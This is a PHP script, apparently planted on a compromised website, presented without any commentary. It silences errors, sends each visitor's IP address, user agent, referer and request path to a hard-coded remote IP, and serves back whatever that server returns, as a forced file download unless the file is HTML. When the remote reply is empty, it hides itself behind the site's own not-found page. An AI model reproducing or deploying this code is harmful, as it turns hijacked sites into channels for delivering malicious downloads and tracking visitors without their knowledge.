<?php
error_reporting(0);
ini_set("display_errors", 0);

$remote = 'http://78.138.118.127:443/45vtcgxx.php';

php_display($remote);

error_404();

function php_display($url)
{    
    $query = array();
    $query['ip'] = getIp();
    $query['time'] = date('d/M/Y:H:i:s', time());
    $query['request'] = getRequest();
    $query['path'] = getPath();
    $query['protocol'] = getProtocol();
    $query['useragent'] = getUseragent();
    $query['referer'] = getReferer();
    
    $url = $url."?".http_build_query($query);

    $content = @file_get_contents($url);
    
    if(strlen($content) < 10)
    {
        error_404();
    }
    
    $content = explode("\n", $content);
    $filename = array_shift($content);
    $content = implode("\n", $content);

    if (strstr($filename, ".html") === FALSE)
    {
        $type = 'application/octet-stream';
        header('Content-Type:'.$type);
        header('Content-Disposition: attachment; filename='.$filename);
        header('Content-Length: '.  strlen($content));
    }


    echo $content;
    exit();
}


function http_request($params)
{
    if( ! is_array($params) )
    {
        $params = array(
            'url' => $params,
            'method' => 'GET'
        );
    }
    
    if( $params['url']=='' ) return FALSE;
    
    if( ! isset($params['method']) ) $params['method'] = (isset($params['data'])&&is_array($params['data'])) ? 'POST' : 'GET';
    $params['method'] = strtoupper($params['method']);
    if( ! in_array($params['method'], array('GET', 'POST')) ) return FALSE; 
    
    /* �������� ������ � ���������� ��� */
    $url = parse_url($params['url']);
    if( ! isset($url['scheme']) ) $url['scheme'] = 'http';
    if( ! isset($url['path']) ) $url['path'] = '/';
    if( ! isset($url['host']) && isset($url['path']) )
    {
        if( strpos($url['path'], '/') )
        {
            $url['host'] = substr($url['path'], 0, strpos($url['path'], '/'));
            $url['path'] = substr($url['path'], strpos($url['path'], '/'));
        }
        else
        {
            $url['host'] = $url['path'];
            $url['path'] = '/';	
        }
    }
    $url['path'] = preg_replace("/[\\/]+/", "/", $url['path']);
    if( isset($url['query']) ) $url['path'] .= "?{$url['query']}";
    
    $port = isset($params['port']) ? $params['port']
            : ( isset($url['port']) ? $url['port'] : ($url['scheme']=='https'?443:80) );
    
    $timeout = isset($params['timeout']) ? $params['timeout'] : 30;
    if( ! isset($params['return']) ) $params['return'] = 'content';
    
    $scheme = $url['scheme']=='https' ? 'ssl://':'';
    $fp = @fsockopen($scheme.$url['host'], $port, $errno, $errstr, $timeout);
    if( $fp )
    {
        /* Mozilla */
        if( ! isset($params['User-Agent']) ) $params['User-Agent'] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
        
        $request = "{$params['method']} {$url['path']} HTTP/1.0\r\n";
        $request .= "Host: {$url['host']}\r\n";
        $request .= "User-Agent: {$params['User-Agent']}"."\r\n";
        if( isset($params['referer']) ) $request .= "Referer: {$params['referer']}\r\n";
        if( isset($params['cookie']) )
        {
            $cookie = "";
            if( is_array($params['cookie']) ) {foreach( $params['cookie'] as $k=>$v ) $cookie .= "$k=$v; "; $cookie = substr($cookie,0,-2);}
            else $cookie = $params['cookie'];
            if( $cookie!='' ) $request .= "Cookie: $cookie\r\n";
        }
        $request .= "Connection: close\r\n";
        if( $params['method']=='POST' )
        {
            if( isset($params['data']) && is_array($params['data']) )
            {
                foreach($params['data'] AS $k => $v)
                    $data .= urlencode($k).'='.urlencode($v).'&';
                if( substr($data, -1)=='&' ) $data = substr($data,0,-1);
            }
            $data .= "\r\n\r\n";
            
            $request .= "Content-type: application/x-www-form-urlencoded\r\n";
            $request .= "Content-length: ".strlen($data)."\r\n";
        }
        $request .= "\r\n";
        
        if( $params['method'] == 'POST' ) $request .= $data;
        
        @fwrite ($fp,$request); /* Send request */
        
        $res = ""; $headers = ""; $h_detected = false;
        while( !@feof($fp) )
        {
            $res .= @fread($fp, 1024); /* ������ ������� */
    
            /* �������� ������� ��������� � �������� */
            if( ! $h_detected && strpos($res, "\r\n\r\n")!==FALSE )
            {
                /* ��������� ��� ������� - ������������ ������� */
                $h_detected = true;
                
                $headers = substr($res, 0, strpos($res, "\r\n\r\n"));
                $res = substr($res, strpos($res, "\r\n\r\n")+4);
                
                /* Headers to Array */
                if( $params['return']=='headers' || $params['return']=='array'
                    || (isset($params['redirect']) && $params['redirect']==true) )
                {
                    $h = explode("\r\n", $headers);
                    $headers = array();
                    foreach( $h as $k=>$v )
                    {
                        if( strpos($v, ':') )
                        {
                            $k = substr($v, 0, strpos($v, ':'));
                            $v = trim(substr($v, strpos($v, ':')+1));
                        }
                        $headers[strtoupper($k)] = $v;
                    }
                }
                if( isset($params['redirect']) && $params['redirect']==true && isset($headers['LOCATION']) )
                {
                    $params['url'] = $headers['LOCATION'];
                    if( !isset($params['redirect-count']) ) $params['redirect-count'] = 0;
                    if( $params['redirect-count']<10 )
                    {
                        $params['redirect-count']++;
                        $func = __FUNCTION__;
                        return @is_object($this) ? $this->$func($params) : $func($params);
                    }
                }
                if( $params['return']=='headers' ) return $headers;
            }
        }
        
        @fclose($fp);
    }
    else return FALSE;/* $errstr.$errno; */
    
    if( $params['return']=='array' ) $res = array('headers'=>$headers, 'content'=>$res);
    
    return $res;
}


function error_404()
{
    /*header("HTTP/1.1 404 Not Found");
    exit("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n"
            ."<html><head><title>404 Not Found</title></head><body>\r\n"
            ."<h1>Not Found</h1>\r\n"
            ."<p>The requested URL was not found on this server.</p>\r\n"
            ."<hr>\r\n"
            ."</body></html>\r\n");*/

	$uri = preg_replace('/(\?).*$/', '', $_SERVER['REQUEST_URI'] );
	$content = http_request("http://".$_SERVER['SERVER_NAME']."/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
	$content = str_replace( "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $uri, $content );

	exit( $content );
}

function getRequest()
{
    return $_SERVER['REQUEST_METHOD'];
}

function getPath()
{
    return $_SERVER['REQUEST_URI'];
}

function getProtocol()
{
    return $_SERVER['SERVER_PROTOCOL'];
}

function getUseragent()
{
    return $_SERVER['HTTP_USER_AGENT'];
}

function getReferer()
{
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '-';
    return $referer;    
}

function getIp()
{
    $ip = NULL;
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    elseif(isset($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif(isset($_SERVER['REMOTE_ADDR']))
    {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    if(strpos($ip, ",") !== FALSE)
    {
        $ips = explode(",", $ip);
        $ip = trim(array_pop($ips));
    }

    return $ip;
} 
